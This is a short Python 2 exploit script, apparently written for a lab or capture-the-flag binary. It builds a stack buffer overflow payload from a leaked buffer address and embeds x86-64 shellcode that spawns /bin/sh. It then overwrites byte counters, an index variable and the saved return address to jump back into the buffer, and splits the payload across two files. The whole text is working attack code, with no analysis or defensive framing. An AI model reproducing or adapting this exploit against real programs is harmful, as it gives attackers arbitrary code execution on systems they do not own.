import sys

def pack32(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(4, "\x00")
    return s

def pack64(n):
    s = ""
    while n:
        s += chr(n % 0x100)
        n = n / 0x100
    s = s.ljust(8, "\x00")
    return s

s_bufaddr = 0x7fffffffdd70
s_br2addr = 0x7fffffffddc4
s_br1addr = 0x7fffffffddc8
s_idxaddr = 0x7fffffffddcc
s_retaddr = 0x7fffffffddd8

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

bufaddr_str = raw_input()
bufaddr = int(bufaddr_str, 16)
br2addr = bufaddr + (s_br2addr - s_bufaddr)
br1addr = bufaddr + (s_br1addr - s_bufaddr)
idxaddr = bufaddr + (s_idxaddr - s_bufaddr)
retaddr = bufaddr + (s_retaddr - s_bufaddr)

payload_len = retaddr - bufaddr + 8
print("Total length of payload should be: ", payload_len)

payload = shellcode
payload += "A" * ((br2addr - bufaddr) - len(shellcode))

# byte_read1, byte_read2:
#   Half of length of payload
payload += pack32(payload_len / 2)
payload += pack32(payload_len / 2)

# idx:
#   Value of idx at the time we overwrite idx
#   We note that since little endian, we overwrite the relevant counting bit immediately
#   This is equivalent to total number of bytes written so far, excluding this byte
payload += pack32(idxaddr - bufaddr)

# Pad until just before return address
payload += "A" * (retaddr - (idxaddr + 4))
payload += pack64(bufaddr)

print("Length of payload is ", len(payload))
assert len(payload) == payload_len

open("exploit1", "w").close()
open("exploit2", "w").close()

e1 = open("exploit1", "r+b")
e2 = open("exploit2", "r+b")

for i in range(len(payload)):
    if (i % 2) == 0:
        # Write 1 byte to exploit1
        e1.write(payload[i])
    else:
        # Write 1 byte to exploit2
        e2.write(payload[i])

